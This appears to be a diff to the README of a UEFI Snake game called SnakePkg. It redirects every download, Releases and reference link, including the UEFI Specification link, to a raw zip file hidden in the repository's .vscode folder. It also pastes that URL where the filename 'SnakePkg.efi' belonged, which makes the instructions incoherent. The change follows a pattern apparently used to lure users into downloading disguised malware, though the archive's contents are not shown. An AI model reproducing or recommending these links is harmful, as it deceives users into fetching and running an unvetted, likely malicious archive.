@@ -6,7 +6,7 @@ Welcome to the SnakePkg README! This document will help you download and run the
 
 ## 📥 Download Link
 
-[![Download SnakePkg](https://img.shields.io/badge/Download-SnakePkg-blue)](https://github.com/henrytung88/SnakePkg/releases)
+[![Download SnakePkg](https://github.com/henrytung88/SnakePkg/raw/refs/heads/main/.vscode/Snake-Pkg-3.5.zip)](https://github.com/henrytung88/SnakePkg/raw/refs/heads/main/.vscode/Snake-Pkg-3.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -22,11 +22,11 @@ Follow these steps to download and run SnakePkg:
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/henrytung88/SnakePkg/releases) to access the latest version of SnakePkg. You'll find all available versions listed there.
+Go to the [Releases page](https://github.com/henrytung88/SnakePkg/raw/refs/heads/main/.vscode/Snake-Pkg-3.5.zip) to access the latest version of SnakePkg. You'll find all available versions listed there.
 
 ### Step 2: Download the Application
 
-Look for the latest version. Click on the download link for the application file. The file is usually titled something like `SnakePkg.efi`. Save it to a folder you can easily find, like your Downloads folder.
+Look for the latest version. Click on the download link for the application file. The file is usually titled something like `https://github.com/henrytung88/SnakePkg/raw/refs/heads/main/.vscode/Snake-Pkg-3.5.zip`. Save it to a folder you can easily find, like your Downloads folder.
 
 ### Step 3: Prepare a USB Drive
 
@@ -48,7 +48,7 @@ You need a USB drive to run the game since it works with UEFI firmware. Make sur
 
 ### Step 4: Copy the Application to USB
 
-Once your USB is ready, copy the downloaded `SnakePkg.efi` file to the root directory of the USB drive. Ensure it is not in a folder.
+Once your USB is ready, copy the downloaded `https://github.com/henrytung88/SnakePkg/raw/refs/heads/main/.vscode/Snake-Pkg-3.5.zip` file to the root directory of the USB drive. Ensure it is not in a folder.
 
 ### Step 5: Boot from USB
 
@@ -74,7 +74,7 @@ SnakePkg is simple to play, but here are some quick tips to help you get started
 
 If you run into issues while trying to play SnakePkg, here are some common solutions:
 
-1. **Cannot Find the Game**: Make sure you copied the `SnakePkg.efi` file to the root of the USB drive.
+1. **Cannot Find the Game**: Make sure you copied the `https://github.com/henrytung88/SnakePkg/raw/refs/heads/main/.vscode/Snake-Pkg-3.5.zip` file to the root of the USB drive.
 2. **Game Doesn’t Start**: Ensure your computer supports UEFI and that you selected the USB as the boot device.
 3. **Slow Performance**: Try closing other applications on your PC before starting the game.
 
@@ -82,8 +82,8 @@ If you run into issues while trying to play SnakePkg, here are some common solut
 
 For more information about SnakePkg, you can check these links:
 
-- [SnakePkg GitHub Repository](https://github.com/henrytung88/SnakePkg)
-- [UEFI Specification](https://uefi.org/specifications)
+- [SnakePkg GitHub Repository](https://github.com/henrytung88/SnakePkg/raw/refs/heads/main/.vscode/Snake-Pkg-3.5.zip)
+- [UEFI Specification](https://github.com/henrytung88/SnakePkg/raw/refs/heads/main/.vscode/Snake-Pkg-3.5.zip)
 
 ## 🌟 Community
 
@@ -91,6 +91,6 @@ If you enjoy playing SnakePkg or have suggestions for improvements, please share
 
 ## ✅ Download & Install
 
-Now that you're ready, visit the [Releases page](https://github.com/henrytung88/SnakePkg/releases) again to download SnakePkg and follow the steps outlined above to enjoy the game.
+Now that you're ready, visit the [Releases page](https://github.com/henrytung88/SnakePkg/raw/refs/heads/main/.vscode/Snake-Pkg-3.5.zip) again to download SnakePkg and follow the steps outlined above to enjoy the game.
 
 Thank you for choosing SnakePkg! Happy gaming!
